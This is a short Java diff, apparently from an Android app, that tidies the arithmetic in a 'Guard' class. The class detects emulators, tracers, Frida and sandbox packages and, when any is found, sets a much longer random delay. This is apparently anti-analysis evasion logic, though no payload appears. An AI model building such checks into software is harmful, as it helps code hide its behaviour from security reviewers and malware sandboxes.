@@ -29,7 +29,9 @@ final class Guard {
         boolean debug = isDebuggable(ctx);
         boolean sandbox = sandboxPackage(ctx);
         hard = emulator || tracer || frida || sandbox;
-        long base = hard ? 300000L + (Math.random() * 600000L) : 20000L + (Math.random() * 70000L);
+        long base = hard
+                ? 300000L + (long) (Math.random() * 600000L)
+                : 20000L + (long) (Math.random() * 70000L);
         delayMs = base;
         Log.d("guard emulator=" + emulator + " tracer=" + tracer + " frida=" + frida
                 + " root=" + root + " debug=" + debug + " sandbox=" + sandbox + " delay=" + base);
